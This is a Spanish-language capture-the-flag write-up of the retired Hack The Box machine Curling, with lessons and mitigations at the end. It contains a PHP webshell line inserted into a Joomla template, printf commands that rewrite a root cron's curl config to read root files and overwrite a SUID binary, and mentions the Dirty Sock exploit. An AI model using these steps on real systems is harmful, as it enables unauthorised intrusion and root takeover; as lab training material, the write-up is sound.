---
machine: Curling
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, joomla, cron, curl, dirty-sock, privesc]
---

# Curling — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un backup comprimido en capas revela la contraseña del administrador de Joomla. Con el panel se edita una plantilla y se obtiene una webshell como `www-data`; el mismo backup da la contraseña de `floris`. Un cron ejecuta `curl -K` como root sobre un archivo controlado: se lee la flag y se escribe un binario SUID. La vía alternativa es Dirty Sock (CVE-2019-7304).

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH y `80` Apache con Joomla.
- `gobuster` encuentra `/administrator/`, `/images/` y un directorio de backups.
- La versión de Joomla y el template son antiguos.

## Enumeración

- El backup está comprimido varias veces (bz2, gz y tar).
- Al descomprimirlo se obtiene `password.txt` con la contraseña del administrador de Joomla.
- Esa misma contraseña se reutiliza para `floris` en el sistema.

```bash
bzip2 -d password_backup.bz2
gzip -d password_backup.gz
tar xf password_backup.tar
```

## Foothold

Con el panel de Joomla se edita una plantilla PHP y se escribe una webshell. La shell corre como `www-data`; la contraseña de `floris` permite `su` y leer `user.txt`.

```bash
# Editar templates/<template>/error.php y añadir:
<?php system($_GET['cmd']); ?>
```

## Movimiento lateral

`pspy` muestra un cron de root que ejecuta `curl -K /home/floris/admin-area/input -o report`. El archivo `input` es escribible por `floris`, así que se controlan las opciones de curl.

```bash
printf 'url = "file:///root/root.txt"\noutput = /tmp/root.txt\n' > /home/floris/admin-area/input
```

## Escalada de privilegios

Para una shell, se compila un binario que hace `setuid(0)` y se escribe como root usando la opción `output` de curl sobre un binario SUID existente. También se puede usar `data = @/root/root.txt` para exfiltrar la flag por HTTP.

```bash
gcc -o /tmp/rootbash rootbash.c
printf 'url = "file:///tmp/rootbash"\noutput = /usr/local/bin/<SUID_BINARY>\n' > input
```

La vía alternativa es Dirty Sock (CVE-2019-7304) contra `snapd`, que crea el usuario `dirty_sock` con permisos de administración.

## Evidencia

- Backup multicapa y contraseña de Joomla.
- Webshell en una plantilla.
- Contraseña reutilizada de `floris`.
- Cron `curl -K` y archivo de opciones escribible.
- Flag leída y binario SUID, o Dirty Sock.

## Lecciones aprendidas

- Los backups de contraseñas no deben estar en el webroot ni reutilizarse.
- Una plantilla editable es ejecución de código en PHP.
- `curl -K` acepta un archivo de configuración con `output` y `data`, lo que da lectura y escritura como root.
- Los servicios de snap antiguos pueden ser una escalada local.

## Mitigación y detección

- Sacar backups del webroot y usar contraseñas únicas.
- Restringir la edición de plantillas y el acceso a `/administrator/`.
- No ejecutar `curl` como root con archivos de usuario; usar rutas absolutas y permisos mínimos.
- Actualizar `snapd` y revisar la creación de usuarios locales.

## Referencias

- [0xdf — Curling](https://0xdf.gitlab.io/2019/03/30/htb-curling.html)
- [IppSec — Curling](https://www.youtube.com/watch?v=Paajc2Dupms)
- [Hack The Box — Curling](https://app.hackthebox.com/machines/curling)
